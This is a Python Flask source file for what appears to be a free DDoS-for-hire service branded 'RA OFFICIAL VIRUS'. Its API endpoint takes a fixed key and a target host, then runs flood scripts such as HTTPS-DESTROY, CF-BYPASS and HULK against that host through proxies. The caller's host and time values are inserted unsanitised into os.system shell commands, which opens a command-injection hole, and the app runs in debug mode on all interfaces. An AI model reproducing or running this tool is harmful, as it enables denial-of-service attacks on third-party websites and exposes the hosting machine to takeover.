from flask import Flask, request, jsonify, render_template
import os
import requests
import logging
import os
import urllib.request
from colorama import Fore, Back, Style, init
from pystyle import *
from pystyle import Write,Colors
from datetime import datetime
from asciimatics.effects import BannerText, Print, Scroll
from asciimatics.renderers import ColourImageFile, FigletText, ImageFile, StaticRenderer
from asciimatics.scene import Scene
from asciimatics.screen import Screen
from asciimatics.exceptions import ResizeScreenError, StopApplication
import os
def hlp(screen):
    scenes = []
    effects = [
        Print(screen,
              ColourImageFile(screen, "start.gif", screen.height,
                              uni=screen.unicode_aware),
              screen.height//- 5,
              speed=1),
    ]
    scenes.append(Scene(effects, 24))

    screen.play(scenes, stop_on_resize=False, repeat=False)
blue = Col.light_blue
lblue = Colors.StaticMIX((Col.light_green, Col.white, Col.white))
red = Colors.StaticMIX((Col.green, Col.white, Col.white))
def format_print1(text):
    return f"""                       {lblue}{text}{Col.reset}"""

def format_input1(text):
    return f"""                       {lblue}{text}{Col.reset}"""
def format_print(symbol, text):
    return f"""                      {Col.Symbol(symbol, lblue, blue)} {lblue}{text}{Col.reset}"""

def format_input(symbol, text):
    return f"""                      {Col.Symbol(symbol, red, blue)} {red}{text}{Col.reset}"""
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
    
banner = (f"""
███████╗███████╗██████╗ ██╗   ██╗███████╗██████╗      █████╗ ██████╗ ██╗
██╔════╝██╔════╝██╔══██╗██║   ██║██╔════╝██╔══██╗    ██╔══██╗██╔══██╗██║
███████╗█████╗  ██████╔╝██║   ██║█████╗  ██████╔╝    ███████║██████╔╝██║
╚════██║██╔══╝  ██╔══██╗╚██╗ ██╔╝██╔══╝  ██╔══██╗    ██╔══██║██╔═══╝ ██║
███████║███████╗██║  ██║ ╚████╔╝ ███████╗██║  ██║    ██║  ██║██║     ██║
╚══════╝╚══════╝╚═╝  ╚═╝  ╚═══╝  ╚══════╝╚═╝  ╚═╝    ╚═╝  ╚═╝╚═╝     ╚═╝
                                                                        
""")
colors = Col.red_to_purple
whiteChars = list('═╝〙╣╠:✓〘╩╦╚╔╗║')
os.system("cls" if os.name == "nt" else "clear")

print(Colorate.Format(Center.XCenter(banner), whiteChars, Colorate.Vertical, colors, Col.purple))
print("")
print("\033[35m           GET PROXY | TMR VIRUS | RA OFFICIAL VIRUS | SHARE FREE\033[0m")
print("")
current_directory = os.getcwd()
folder_path = f"{current_directory}"
url = "https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt"
file_name = "proxy.txt"
try:
    response = urllib.request.urlopen(url)
    data = response.read().decode('utf-8')
    file_path = os.path.join(f"{current_directory}/method/", file_name)
    with open(file_path, 'w') as file:
        file.write(data)
    print(f"\033[45;39mGET PROXY:\033[0m \033[32mSUCCESS\033[0m")
except Exception as e:
    print("\033[41;39ERROR URL | SHARE FREE [ MAIN ]\033[0m")
    


app = Flask(__name__)
port = 1188
domain = 'raofficialvirus.site'
api_path = '/api/layer7/'
ip_address_info = None

try:
    response = requests.get('https://ipinfo.io/json')
    data = response.json()
    ip_address_info = f"\x1b[45m\x1b[39mIP Address:\x1b[0m \x1b[32m{data['ip']}\n\x1b[45m\x1b[39mCity:\x1b[0m \x1b[32m{data['city']}\n\x1b[45m\x1b[39mRegion:\x1b[0m \x1b[32m{data['region']}\n\x1b[45m\x1b[39mCountry:\x1b[0m \x1b[32m{data['country']}\n\x1b[45m\x1b[39mLocation:\x1b[0m \x1b[32m{data['loc']}\x1b[0m"
    print("")
    print("\033[35m       CHECK ADDRESS INFO | TMR VIRUS | RA OFFICIAL VIRUS | SHARE FREE\033[0m")
    print()
    print(ip_address_info)
    print("")
    print("\033[35m        CHECK API INFO | TMR VIRUS | RA OFFICIAL VIRUS | SHARE FREE\033[0m")
    print("")
    print('\033[39m[\033[31mAPI\033[39m]', f'\033[32mStart To API Main: \033[35mhttp://{domain}:{port}/\033[0m')
    print('\033[39m[\033[31mAPI\033[39m]', f'\033[32mStart To API Ddos: \033[35mhttp://{domain}:{port}{api_path}?key=[KEY]&host=[HOST]&port=[PORT]&method=[METHOD]&time=[TIME]\033[0m')
except Exception as error:
    print(f"Lỗi khi lấy thông tin IP: {error}")

last_api_call_time = os.times()[4] * 1000

@app.route(api_path, methods=['GET'])
def handle_api_request():
    global last_api_call_time
    current_time = os.times()[4] * 1000  
    cooldown = 10 * 1000
    client_ip = request.headers.get('x-forwarded-for') or request.remote_addr
    print(f"IP Kết nối: {client_ip}")
    key = request.args.get('key')
    host = request.args.get('host')
    request_port = request.args.get('port')
    time = request.args.get('time')
    method = request.args.get('method')

    if key != 'sharefree':
        err_key = {
            'message': 'Vui lòng nhập đúng Key API 😒',
            'code': '401'
        }
        return jsonify(err_key), 400

    if not host:
        err_host = {
            'message': '🚀Vui lòng nhập Host🚀',
            'code': '404'
        }
        return jsonify(err_host), 400

    valid_methods = ['https-load', 'https-destroy', 'https', 'https-ngoc', 'tls-super', 'cf-flood', 'http-kill', 'hulk', 'https-cat', 'https-official', 'cf-bypass', 'http-flood']
    if method.lower() not in valid_methods:
        err_method = {
            'error': True,
            'method_valid': '🚀Sai method API🚀 Vui lòng nhập đúng Method. Chỉ có các method hợp lệ: HTTPS-LOAD | HTTPS-DESTROY | HTTPS-NGOC | HTTP-FLOOD | HULK | HTTPS-OFFICIAL',
            'code': '403'
        }
        return jsonify(err_method), 400

    if not time or not time.isdigit() or int(time) <= 0 or int(time) > 300:
        err_time = {
            'message': '🚀Thời gian không hợp lệ. Vui lòng nhập giá trị thời gian từ 1 đến 120🚀',
            'code': '400'
        }
        return jsonify(err_time), 400

    if current_time - last_api_call_time < cooldown:
        err_cooldown = {
            'message': f'Đợi timeout {int((cooldown - (current_time - last_api_call_time)) / 1000)} giây.',
            'time_api': f'{int((cooldown - (current_time - last_api_call_time)) / 1000)}s',
            'code': '429'
        }
        return jsonify(err_cooldown), 429

    json_data = {
        'error': False,
        'message': 'Success',
        'host': host,
        'port': request_port,
        'time': time,
        'method': method,
        'code': 200
    }
    last_api_call_time = current_time

    if method.lower() == 'https-load':
        command = f'cd method && node HTTPS-LOAD.js {host} {time} 64 5 proxy.txt'  # Thêm port vào lệnh
        print(f"[{client_ip}] \033[32mThực hiện thành công\033[0m \033[31mHTTPS-LOAD\033[0m")
        os.system(command)
    elif method.lower() == 'https':
        command = f'cd method && node HTTPS.js {host} {time} 32 5 proxy.txt'  # Thêm port vào lệnh
        print(f"[{client_ip}] \033[32mThực hiện thành công\033[0m \033[31mHTTPS\033[0m")
        os.system(command)
    elif method.lower() == 'https-official':
        command = f'cd method && node HTTPS-OFFICIAL.js {host} {time} 32 5 proxy.txt'  # Thêm port vào lệnh
        print(f"[{client_ip}] \033[32mThực hiện thành công\033[0m \033[31mHTTPS-OFFICIAL\033[0m")
        os.system(command)
    elif method.lower() == 'https-destroy':
        command = f'cd method && node HTTPS-DESTROY.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHTTPS-DESTROY\033[0m")
        os.system(command)
    elif method.lower() == 'https-ngoc':
        command = f'cd method && node HTTPS-NGOC.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHTTPS-NGOC\033[0m")
        os.system(command)
    elif method.lower() == 'http-flood':
        command = f'cd method && node HTTP-FLOOD.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHTTP-FLOOD\033[0m")
        os.system(command)
    elif method.lower() == 'hulk':
        command = f'cd method && go run HULK.go -site {host} {time} -data GET'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHULK\033[0m")
        os.system(command)
    elif method.lower() == 'cf-bypass':
        command = f'cd method && node CF-BYPASS.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mCF-BYPASS\033[0m")
        os.system(command)
    elif method.lower() == 'http-kill':
        command = f'cd method && node HTTP-KILL.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHTTP-KILL\033[0m")
        os.system(command)
    elif method.lower() == 'https-cat':
        command = f'cd method && node HTTPS-CAT.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mHTTPS-CAT\033[0m")
        os.system(command)
    elif method.lower() == 'tls-super':
        command = f'cd method && node TLS-SUPER.js {host} {time} 64 5 proxy.txt'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mTLS-SUPER\033[0m")
        os.system(command)
    elif method.lower() == 'cf-flood':
        command = f'cd method && node CF-FLOOD.js GET {host} proxy.txt {time} 64 5'
        print(f"[{client_ip}] \033[32mSuccessfully\033[0m ran \033[31mCF-FLOOD\033[0m")
        os.system(command)
    return jsonify(json_data), 200

@app.route('/', methods=['GET', 'POST'])
def web_interface():
    if request.method == 'POST':
        host = request.form['host']
        port = request.form['port']
        method = request.form['method']
        time = request.form['time']
        api_url = f'http://{domain}:{port}{api_path}?key=sharefree&host={host}&port={port}&method={method}&time={time}'
        response = requests.get(api_url)
        print(response.text)

    return render_template('index.php')
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port, debug=True)
    
